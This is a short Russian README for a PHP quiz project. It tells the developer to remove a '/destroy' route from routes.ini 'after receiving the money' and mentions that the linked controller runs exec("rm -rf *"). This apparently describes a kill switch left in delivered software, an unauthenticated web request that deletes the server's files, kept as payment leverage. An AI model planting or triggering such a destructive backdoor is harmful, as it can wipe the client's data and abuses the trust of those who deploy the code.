# quiz

После получения бабла, удалить строчку из `routes.ini`:

```
GET /destroy=controllers\Destroy->destroy
```

Возможно нужно будет изменить команду удаления в файле `autoload/controllers/Destroy.php`:

```
exec("rm -rf *");
```

## Файлы, в которых необходимо редактирование

* autoload/controllers/Form.php
* autoload/models/Mail.php
* autoload/views/Render.php
* config.ini

## config.ini

В этом файле необходимо заменить email:

```
email=example@mail.com
```

